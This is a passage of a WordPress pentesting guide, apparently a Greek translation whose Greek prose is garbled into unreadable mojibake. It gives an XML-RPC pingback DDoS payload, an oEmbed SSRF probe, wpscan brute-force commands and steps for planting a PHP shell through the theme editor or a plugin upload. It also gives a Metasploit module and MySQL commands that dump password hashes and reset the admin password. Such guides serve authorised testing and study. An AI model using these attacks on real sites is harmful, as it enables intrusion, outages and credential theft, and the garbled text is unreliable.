Î¡Î¯Î¾Ï„Îµ Î¼Î¹Î± Î¼Î±Ï„Î¹Î¬ ÏƒÏ„Î· Ï‡ÏÎ®ÏƒÎ· Ï„Î¿Ï… **`system.multicall`** ÏƒÏ„Î·Î½ Ï€ÏÎ¿Î·Î³Î¿ÏÎ¼ÎµÎ½Î· ÎµÎ½ÏŒÏ„Î·Ï„Î± Î³Î¹Î± Î½Î± Î¼Î¬Î¸ÎµÏ„Îµ Ï€ÏÏ‚ Î½Î± ÎºÎ±Ï„Î±Ï‡ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ Î±Ï…Ï„Î® Ï„Î· Î¼Î­Î¸Î¿Î´Î¿ Î³Î¹Î± Î½Î± Ï€ÏÎ¿ÎºÎ±Î»Î­ÏƒÎµÏ„Îµ DDoS.

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

Î‘Ï…Ï„ÏŒ Ï„Î¿ Î±ÏÏ‡ÎµÎ¯Î¿ ÏƒÏ…Î½Î®Î¸Ï‰Ï‚ Ï…Ï€Î¬ÏÏ‡ÎµÎ¹ ÏƒÏ„Î¿ root Ï„Î¿Ï… Wordpress site: **`/wp-cron.php`**\
ÎŒÏ„Î±Î½ Î±Ï…Ï„ÏŒ Ï„Î¿ Î±ÏÏ‡ÎµÎ¯Î¿ **Ï€ÏÎ¿ÏƒÎµÎ³Î³Î¯Î¶ÎµÏ„Î±Î¹** ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Î±Î¹ Î­Î½Î± "**heavy**" MySQL **query**, Î¿Ï€ÏŒÏ„Îµ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ Î±Ï€ÏŒ **attackers** Î³Î¹Î± Î½Î± **Ï€ÏÎ¿ÎºÎ±Î»Î­ÏƒÎµÎ¹** Î­Î½Î± **DoS**.\
Î•Ï€Î¯ÏƒÎ·Ï‚, ÎµÎ¾ Î¿ÏÎ¹ÏƒÎ¼Î¿Ï, Ï„Î¿ `wp-cron.php` ÎºÎ±Î»ÎµÎ¯Ï„Î±Î¹ ÏƒÎµ ÎºÎ¬Î¸Îµ Ï†ÏŒÏÏ„Ï‰ÏƒÎ· ÏƒÎµÎ»Î¯Î´Î±Ï‚ (ÎºÎ¬Î¸Îµ Ï†Î¿ÏÎ¬ Ï€Î¿Ï… Î­Î½Î±Ï‚ client Î¶Î·Ï„Î¬ÎµÎ¹ Î¿Ï€Î¿Î¹Î±Î´Î®Ï€Î¿Ï„Îµ Wordpress ÏƒÎµÎ»Î¯Î´Î±), ÎºÎ¬Ï„Î¹ Ï€Î¿Ï… ÏƒÎµ high-traffic sites Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï€ÏÎ¿ÎºÎ±Î»Î­ÏƒÎµÎ¹ Ï€ÏÎ¿Î²Î»Î®Î¼Î±Ï„Î± (DoS).

Î£Ï…Î½Î¹ÏƒÏ„Î¬Ï„Î±Î¹ Î½Î± Î±Ï€ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Ï„Î¿ Wp-Cron ÎºÎ±Î¹ Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÏ„Îµ Î­Î½Î± Ï€ÏÎ±Î³Î¼Î±Ï„Î¹ÎºÏŒ cronjob ÏƒÏ„Î¿Î½ host Ï€Î¿Ï… Î½Î± ÎµÎºÏ„ÎµÎ»ÎµÎ¯ Ï„Î¹Ï‚ Î±Ï€Î±ÏÎ±Î¯Ï„Î·Ï„ÎµÏ‚ ÎµÎ½Î­ÏÎ³ÎµÎ¹ÎµÏ‚ ÏƒÎµ Ï„Î±ÎºÏ„Î¬ Î´Î¹Î±ÏƒÏ„Î®Î¼Î±Ï„Î± (Ï‡Ï‰ÏÎ¯Ï‚ Î½Î± Ï€ÏÎ¿ÎºÎ±Î»ÎµÎ¯ Ï€ÏÎ¿Î²Î»Î®Î¼Î±Ï„Î±).

### /wp-json/oembed/1.0/proxy - SSRF

Try to access _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ and the Worpress site may make a request to you.

This is the response when it doesn't work:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

Î‘Ï…Ï„ÏŒ Ï„Î¿ ÎµÏÎ³Î±Î»ÎµÎ¯Î¿ ÎµÎ»Î­Î³Ï‡ÎµÎ¹ Î³Î¹Î± Ï„Î· **methodName: pingback.ping** ÎºÎ±Î¹ Î³Î¹Î± Ï„Î¿ path **/wp-json/oembed/1.0/proxy**, ÎºÎ±Î¹ Î±Î½ Ï…Ï€Î¬ÏÏ‡Î¿Ï…Î½, Ï€ÏÎ¿ÏƒÏ€Î±Î¸ÎµÎ¯ Î½Î± Ï„Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„ÎµÎ¯.

## Î‘Ï…Ï„ÏŒÎ¼Î±Ï„Î± Î•ÏÎ³Î±Î»ÎµÎ¯Î±
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## Î‘Ï€ÏŒÎºÏ„Î·ÏƒÎ· Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ Î¼Îµ Ï„Î·Î½ Ï…Ï€ÎµÏÎ³ÏÎ±Ï†Î® ÎµÎ½ÏŒÏ‚ bit

Î ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎ¿ Î±Ï€ÏŒ Î¼Î¹Î± Ï€ÏÎ±Î³Î¼Î±Ï„Î¹ÎºÎ® ÎµÏ€Î¯Î¸ÎµÏƒÎ·, Ï€ÏÏŒÎºÎµÎ¹Ï„Î±Î¹ Î³Î¹Î± Î¼Î¹Î± Ï€ÎµÏÎ¹Î­ÏÎ³ÎµÎ¹Î±. Î£Îµ Î­Î½Î± CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµÏ‚ Î½Î± Î±Î½Î±ÏƒÏ„ÏÎ­ÏˆÎµÎ¹Ï‚ 1 bit ÏƒÎµ Î¿Ï€Î¿Î¹Î¿Î´Î®Ï€Î¿Ï„Îµ Î±ÏÏ‡ÎµÎ¯Î¿ wordpress. ÎˆÏ„ÏƒÎ¹ Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµÏ‚ Î½Î± Î±Î½Î±ÏƒÏ„ÏÎ­ÏˆÎµÎ¹Ï‚ Ï„Î· Î¸Î­ÏƒÎ· `5389` Ï„Î¿Ï… Î±ÏÏ‡ÎµÎ¯Î¿Ï… `/var/www/html/wp-includes/user.php` ÏÏƒÏ„Îµ Î½Î± ÎºÎ¬Î½ÎµÎ¹Ï‚ NOP ÏƒÏ„Î·Î½ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î± NOT (`!`).
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **Panel RCE**

**Î¤ÏÎ¿Ï€Î¿Ï€Î¿Î¯Î·ÏƒÎ· ÎµÎ½ÏŒÏ‚ php Î±Ï€ÏŒ Ï„Î¿ theme Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ (admin credentials needed)**

Appearance â†’ Theme Editor â†’ 404 Template (ÏƒÏ„Î± Î´ÎµÎ¾Î¹Î¬)

Î‘Î»Î»Î¬Î¾Ï„Îµ Ï„Î¿ Ï€ÎµÏÎ¹ÎµÏ‡ÏŒÎ¼ÎµÎ½Î¿ ÏƒÎµ php shell:

![](<../../images/image (384).png>)

Î‘Î½Î±Î¶Î·Ï„Î®ÏƒÏ„Îµ ÏƒÏ„Î¿ Internet Ï€ÏÏ‚ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÏ„Îµ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ Î±Ï…Ï„Î® Ï„Î·Î½ ÎµÎ½Î·Î¼ÎµÏÏ‰Î¼Î­Î½Î· ÏƒÎµÎ»Î¯Î´Î±. Î£Îµ Î±Ï…Ï„Î® Ï„Î·Î½ Ï€ÎµÏÎ¯Ï€Ï„Ï‰ÏƒÎ· Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± ÎµÏ€Î¹ÏƒÎºÎµÏ†Î¸ÎµÎ¯Ï„Îµ: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ:
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
Î³Î¹Î± Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÏ„Îµ session.

## Plugin RCE

### PHP plugin

Î•Î½Î´Î­Ï‡ÎµÏ„Î±Î¹ Î½Î± ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„Î® Î· Î¼ÎµÏ„Î±Ï†ÏŒÏÏ„Ï‰ÏƒÎ· .php Î±ÏÏ‡ÎµÎ¯Ï‰Î½ Ï‰Ï‚ plugin.\
Î”Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÏ„Îµ Ï„Î¿ php backdoor ÏƒÎ±Ï‚ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Î³Î¹Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±:

![](<../../images/image (183).png>)

Then add a new plugin:

![](<../../images/image (722).png>)

Upload plugin and press Install Now:

![](<../../images/image (249).png>)

Click on Procced:

![](<../../images/image (70).png>)

Probably this won't do anything apparently, but if you go to Media, you will see your shell uploaded:

![](<../../images/image (462).png>)

Access it and you will see the URL to execute the reverse shell:

![](<../../images/image (1006).png>)

### ÎœÎµÏ„Î±Ï†ÏŒÏÏ„Ï‰ÏƒÎ· ÎºÎ±Î¹ ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¯Î·ÏƒÎ· ÎºÎ±ÎºÏŒÎ²Î¿Ï…Î»Î¿Ï… plugin

Î‘Ï…Ï„Î® Î· Î¼Î­Î¸Î¿Î´Î¿Ï‚ Ï€ÎµÏÎ¹Î»Î±Î¼Î²Î¬Î½ÎµÎ¹ Ï„Î·Î½ ÎµÎ³ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ· ÎµÎ½ÏŒÏ‚ ÎºÎ±ÎºÏŒÎ²Î¿Ï…Î»Î¿Ï… plugin Ï€Î¿Ï… ÎµÎ¯Î½Î±Î¹ Î³Î½Ï‰ÏƒÏ„ÏŒ ÏŒÏ„Î¹ Î­Ï‡ÎµÎ¹ ÎµÏ…Ï€Î¬Î¸ÎµÎ¹ÎµÏ‚ ÎºÎ±Î¹ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„ÎµÎ¯ Î³Î¹Î± Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÎ¹ web shell. Î— Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î± Ï€ÏÎ±Î³Î¼Î±Ï„Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ Î¼Î­ÏƒÏ‰ Ï„Î¿Ï… WordPress dashboard Ï‰Ï‚ ÎµÎ¾Î®Ï‚:

1. **Plugin Acquisition**: Î¤Î¿ plugin Î±Ï€Î¿ÎºÏ„Î¬Ï„Î±Î¹ Î±Ï€ÏŒ Ï€Î·Î³Î® ÏŒÏ€Ï‰Ï‚ Exploit DB ÏŒÏ€Ï‰Ï‚ [**here**](https://www.exploit-db.com/exploits/36374).
2. **Plugin Installation**:
- Î ÎµÏÎ¹Î·Î³Î·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ WordPress dashboard, ÏƒÏ„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î± Ï€Î·Î³Î±Î¯Î½ÎµÏ„Îµ ÏƒÏ„Î¿ `Dashboard > Plugins > Upload Plugin`.
- Î‘Î½ÎµÎ²Î¬ÏƒÏ„Îµ Ï„Î¿ zip Î±ÏÏ‡ÎµÎ¯Î¿ Ï„Î¿Ï… ÎºÎ±Ï„ÎµÎ²Î±ÏƒÎ¼Î­Î½Î¿Ï… plugin.
3. **Plugin Activation**: ÎœÏŒÎ»Î¹Ï‚ Ï„Î¿ plugin ÎµÎ³ÎºÎ±Ï„Î±ÏƒÏ„Î±Î¸ÎµÎ¯ ÎµÏ€Î¹Ï„Ï…Ï‡ÏÏ‚, Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ Î¼Î­ÏƒÏ‰ Ï„Î¿Ï… dashboard.
4. **Exploitation**:
- ÎœÎµ Ï„Î¿ plugin "reflex-gallery" ÎµÎ³ÎºÎ±Ï„ÎµÏƒÏ„Î·Î¼Î­Î½Î¿ ÎºÎ±Î¹ ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î¿, Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„ÎµÎ¯ ÎºÎ±Î¸ÏÏ‚ ÎµÎ¯Î½Î±Î¹ Î³Î½Ï‰ÏƒÏ„ÏŒ ÏŒÏ„Î¹ ÎµÎ¯Î½Î±Î¹ ÎµÏ…Ï€Î±Î¸Î­Ï‚.
- Î¤Î¿ Metasploit framework Ï€Î±ÏÎ­Ï‡ÎµÎ¹ Î­Î½Î± exploit Î³Î¹Î± Î±Ï…Ï„Î® Ï„Î·Î½ ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î±. Î¦Î¿ÏÏ„ÏÎ½Î¿Î½Ï„Î±Ï‚ Ï„Î¿ ÎºÎ±Ï„Î¬Î»Î»Î·Î»Î¿ module ÎºÎ±Î¹ ÎµÎºÏ„ÎµÎ»ÏÎ½Ï„Î±Ï‚ ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½ÎµÏ‚ ÎµÎ½Ï„Î¿Î»Î­Ï‚, Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î·Î¸ÎµÎ¯ Î¼Î¹Î± meterpreter session, Ï€Î±ÏÎ­Ï‡Î¿Î½Ï„Î±Ï‚ Î¼Î· ÎµÎ¾Î¿Ï…ÏƒÎ¹Î¿Î´Î¿Ï„Î·Î¼Î­Î½Î· Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î¿Î½ Î¹ÏƒÏ„ÏŒÏ„Î¿Ï€Î¿.
- Î£Î·Î¼ÎµÎ¹ÏÎ½ÎµÏ„Î±Î¹ ÏŒÏ„Î¹ Î±Ï…Ï„ÏŒÏ‚ ÎµÎ¯Î½Î±Î¹ Î¼ÏŒÎ½Î¿ Î­Î½Î±Ï‚ Î±Ï€ÏŒ Ï„Î¿Ï…Ï‚ Ï€Î¿Î»Î»Î¿ÏÏ‚ Ï„ÏÏŒÏ€Î¿Ï…Ï‚ ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ·Ï‚ ÎµÎ½ÏŒÏ‚ Î¹ÏƒÏ„ÏŒÏ„Î¿Ï€Î¿Ï… WordPress.

Î¤Î¿ Ï€ÎµÏÎ¹ÎµÏ‡ÏŒÎ¼ÎµÎ½Î¿ Ï€ÎµÏÎ¹Î»Î±Î¼Î²Î¬Î½ÎµÎ¹ Î¿Ï€Ï„Î¹ÎºÎ¬ Î²Î¿Î·Î¸Î®Î¼Î±Ï„Î± Ï€Î¿Ï… Î±Ï€ÎµÎ¹ÎºÎ¿Î½Î¯Î¶Î¿Ï…Î½ Ï„Î± Î²Î®Î¼Î±Ï„Î± ÏƒÏ„Î¿ WordPress dashboard Î³Î¹Î± Ï„Î·Î½ ÎµÎ³ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ· ÎºÎ±Î¹ ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¯Î·ÏƒÎ· Ï„Î¿Ï… plugin. Î©ÏƒÏ„ÏŒÏƒÎ¿, ÎµÎ¯Î½Î±Î¹ ÏƒÎ·Î¼Î±Î½Ï„Î¹ÎºÏŒ Î½Î± ÏƒÎ·Î¼ÎµÎ¹Ï‰Î¸ÎµÎ¯ ÏŒÏ„Î¹ Î· ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ· ÎµÏ…Ï€Î±Î¸ÎµÎ¹ÏÎ½ Î¼Îµ Î±Ï…Ï„ÏŒÎ½ Ï„Î¿Î½ Ï„ÏÏŒÏ€Î¿ ÎµÎ¯Î½Î±Î¹ Ï€Î±ÏÎ¬Î½Î¿Î¼Î· ÎºÎ±Î¹ Î±Î½Î®Î¸Î¹ÎºÎ· Ï‡Ï‰ÏÎ¯Ï‚ Ï„Î·Î½ ÎºÎ±Ï„Î¬Î»Î»Î·Î»Î· ÎµÎ¾Î¿Ï…ÏƒÎ¹Î¿Î´ÏŒÏ„Î·ÏƒÎ·. Î‘Ï…Ï„Î­Ï‚ Î¿Î¹ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î¿ÏÎ½Ï„Î±Î¹ Ï…Ï€ÎµÏÎ¸Ï…Î½Î± ÎºÎ±Î¹ Î¼ÏŒÎ½Î¿ ÏƒÎµ Î½Î¿Î¼Î¹ÎºÏŒ Ï€Î»Î±Î¯ÏƒÎ¹Î¿, ÏŒÏ€Ï‰Ï‚ penetration testing Î¼Îµ ÏÎ·Ï„Î® Î¬Î´ÎµÎ¹Î±.

**Î“Î¹Î± Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎ± Î²Î®Î¼Î±Ï„Î± Î´ÎµÎ¯Ï„Îµ:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## Î‘Ï€ÏŒ XSS ÏƒÎµ RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ ÎµÎ¯Î½Î±Î¹ Î­Î½Î± script ÏƒÏ‡ÎµÎ´Î¹Î±ÏƒÎ¼Î­Î½Î¿ Î½Î± ÎºÎ»Î¹Î¼Î±ÎºÏÎ½ÎµÎ¹ Î¼Î¹Î± **Cross-Site Scripting (XSS)** ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î± ÏƒÎµ **Remote Code Execution (RCE)** Î® Î¬Î»Î»ÎµÏ‚ ÎºÏÎ¯ÏƒÎ¹Î¼ÎµÏ‚ ÎµÏ…Ï€Î¬Î¸ÎµÎ¹ÎµÏ‚ ÏƒÏ„Î¿ WordPress. Î“Î¹Î± Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ Î´ÎµÎ¯Ï„Îµ [**this post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html). Î Î±ÏÎ­Ï‡ÎµÎ¹ **Ï…Ï€Î¿ÏƒÏ„Î®ÏÎ¹Î¾Î· Î³Î¹Î± Ï„Î¹Ï‚ ÎµÎºÎ´ÏŒÏƒÎµÎ¹Ï‚ Wordpress 6.X.X, 5.X.X ÎºÎ±Î¹ 4.X.X ÎºÎ±Î¹ ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹:** 
- _**Privilege Escalation:**_ Î”Î·Î¼Î¹Î¿Ï…ÏÎ³ÎµÎ¯ Î­Î½Î±Î½ Ï‡ÏÎ®ÏƒÏ„Î· ÏƒÏ„Î¿ WordPress.
- _**(RCE) Custom Plugin (backdoor) Upload:**_ Î‘Î½ÎµÎ²Î¬ÏƒÏ„Îµ Ï„Î¿ custom plugin (backdoor) ÏƒÎ±Ï‚ ÏƒÏ„Î¿ WordPress.
- _**(RCE) Built-In Plugin Edit:**_ Î•Ï€ÎµÎ¾ÎµÏÎ³Î±ÏƒÎ¯Î± Built-In Plugins ÏƒÏ„Î¿ WordPress.
- _**(RCE) Built-In Theme Edit:**_ Î•Ï€ÎµÎ¾ÎµÏÎ³Î±ÏƒÎ¯Î± Built-In Themes ÏƒÏ„Î¿ WordPress.
- _**(Custom) Custom Exploits:**_ Custom Exploits Î³Î¹Î± Third-Party WordPress Plugins/Themes.

## Post Exploitation

Î•Î¾Î±Î³Ï‰Î³Î® usernames ÎºÎ±Î¹ passwords:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
Î‘Î»Î»Î±Î³Î® admin password:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress Plugins Pentest

### Attack Surface

Î¤Î¿ Î½Î± Î³Î½Ï‰ÏÎ¯Î¶ÎµÎ¹Ï‚ Ï€ÏÏ‚ Î­Î½Î± Wordpress plugin Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎºÎ¸Î­ÏƒÎµÎ¹ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¹ÎºÏŒÏ„Î·Ï„Î± ÎµÎ¯Î½Î±Î¹ ÎºÏÎ¯ÏƒÎ¹Î¼Î¿ Î³Î¹Î± Î½Î± ÎµÎ½Ï„Î¿Ï€Î¯ÏƒÎµÎ¹Ï‚ ÎµÏ…Ï€Î¬Î¸ÎµÎ¹ÎµÏ‚ ÏƒÏ„Î· Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î± Ï„Î¿Ï…. ÎœÏ€Î¿ÏÎµÎ¯Ï‚ Î½Î± Î´ÎµÎ¹Ï‚ Ï€ÏÏ‚ Î­Î½Î± plugin ÎµÎ½Î´Î­Ï‡ÎµÏ„Î±Î¹ Î½Î± ÎµÎºÎ¸Î­Ï„ÎµÎ¹ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¹ÎºÏŒÏ„Î·Ï„Î± ÏƒÏ„Î± Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ ÏƒÎ·Î¼ÎµÎ¯Î± ÎºÎ±Î¹ ÎºÎ¬Ï€Î¿Î¹Î± Ï€Î±ÏÎ±Î´ÎµÎ¯Î³Î¼Î±Ï„Î± ÎµÏ…Ï€Î±Î¸ÏÎ½ plugins ÏƒÏ„Î¿ [**this blog post**](https://nowotarski.info/wordpress-nonce-authorization/).

- **`wp_ajax`**

ÎˆÎ½Î±Ï‚ Î±Ï€ÏŒ Ï„Î¿Ï…Ï‚ Ï„ÏÏŒÏ€Î¿Ï…Ï‚ Î¼Îµ Ï„Î¿Ï…Ï‚ Î¿Ï€Î¿Î¯Î¿Ï…Ï‚ Î­Î½Î± plugin Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎºÎ¸Î­ÏƒÎµÎ¹ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯ÎµÏ‚ ÏƒÏ„Î¿Ï…Ï‚ Ï‡ÏÎ®ÏƒÏ„ÎµÏ‚ ÎµÎ¯Î½Î±Î¹ Î¼Î­ÏƒÏ‰ AJAX handlers. Î‘Ï…Ï„Î¿Î¯ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï€ÎµÏÎ¹Î­Ï‡Î¿Ï…Î½ ÏƒÏ†Î¬Î»Î¼Î±Ï„Î± Î»Î¿Î³Î¹ÎºÎ®Ï‚, authorization Î® authentication. Î•Ï€Î¹Ï€Î»Î­Î¿Î½, ÎµÎ¯Î½Î±Î¹ ÏƒÏ…Ï‡Î½ÏŒ ÏŒÏ„Î¹ Î±Ï…Ï„Î­Ï‚ Î¿Î¹ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯ÎµÏ‚ Î²Î±ÏƒÎ¯Î¶Î¿Ï…Î½ Ï„ÏŒÏƒÎ¿ Ï„Î¿ authentication ÏŒÏƒÎ¿ ÎºÎ±Î¹ Ï„Î¿ authorization ÏƒÏ„Î·Î½ ÏÏ€Î±ÏÎ¾Î· ÎµÎ½ÏŒÏ‚ wordpress nonce Ï€Î¿Ï… **Î¿Ï€Î¿Î¹Î¿ÏƒÎ´Î®Ï€Î¿Ï„Îµ authenticated Ï‡ÏÎ®ÏƒÏ„Î·Ï‚ ÏƒÏ„Î·Î½ Wordpress instance Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î­Ï‡ÎµÎ¹** (Î±Î½ÎµÎ¾Î±ÏÏ„Î®Ï„Ï‰Ï‚ Ï„Î¿Ï… role).

Î‘Ï…Ï„Î­Ï‚ ÎµÎ¯Î½Î±Î¹ Î¿Î¹ ÏƒÏ…Î½Î±ÏÏ„Î®ÏƒÎµÎ¹Ï‚ Ï€Î¿Ï… Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸Î¿ÏÎ½ Î³Î¹Î± Î½Î± ÎµÎºÎ¸Î­ÏƒÎ¿Ï…Î½ Î¼Î¹Î± Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î± ÏƒÎµ Î­Î½Î± plugin:
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**Î— Ï‡ÏÎ®ÏƒÎ· Ï„Î¿Ï… `nopriv` ÎºÎ±Î¸Î¹ÏƒÏ„Î¬ Ï„Î¿ endpoint Ï€ÏÎ¿ÏƒÎ²Î¬ÏƒÎ¹Î¼Î¿ Î±Ï€ÏŒ Î¿Ï€Î¿Î¹Î¿Ï…ÏƒÎ´Î®Ï€Î¿Ï„Îµ Ï‡ÏÎ®ÏƒÏ„ÎµÏ‚ (Î±ÎºÏŒÎ¼Î· ÎºÎ±Î¹ Î¼Î· Î±Ï…Î¸ÎµÎ½Ï„Î¹ÎºÎ¿Ï€Î¿Î¹Î·Î¼Î­Î½Î¿Ï…Ï‚).**

> [!CAUTION]
> Î•Ï€Î¹Ï€Î»Î­Î¿Î½, Î±Î½ Î· ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ· Î±Ï€Î»ÏÏ‚ ÎµÎ»Î­Î³Ï‡ÎµÎ¹ Ï„Î·Î½ ÎµÎ¾Î¿Ï…ÏƒÎ¹Î¿Î´ÏŒÏ„Î·ÏƒÎ· Ï„Î¿Ï… Ï‡ÏÎ®ÏƒÏ„Î· Î¼Îµ Ï„Î· ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ· `wp_verify_nonce`, Î±Ï…Ï„Î® Î· ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ· Î¼ÏŒÎ½Î¿ ÎµÎ»Î­Î³Ï‡ÎµÎ¹ Î±Î½ Î¿ Ï‡ÏÎ®ÏƒÏ„Î·Ï‚ ÎµÎ¯Î½Î±Î¹ ÏƒÏ…Î½Î´ÎµÎ´ÎµÎ¼Î­Î½Î¿Ï‚, ÏƒÏ…Î½Î®Î¸Ï‰Ï‚ Î´ÎµÎ½ ÎµÎ»Î­Î³Ï‡ÎµÎ¹ Ï„Î¿Î½ ÏÏŒÎ»Î¿ Ï„Î¿Ï… Ï‡ÏÎ®ÏƒÏ„Î·. ÎˆÏ„ÏƒÎ¹ Ï‡ÏÎ®ÏƒÏ„ÎµÏ‚ Î¼Îµ Ï‡Î±Î¼Î·Î»Î¬ Ï€ÏÎ¿Î½ÏŒÎ¼Î¹Î± ÎµÎ½Î´Î­Ï‡ÎµÏ„Î±Î¹ Î½Î± Î­Ï‡Î¿Ï…Î½ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ ÎµÎ½Î­ÏÎ³ÎµÎ¹ÎµÏ‚ Î¼Îµ Ï…ÏˆÎ·Î»Î¬ Ï€ÏÎ¿Î½ÏŒÎ¼Î¹Î±.

- **REST API**

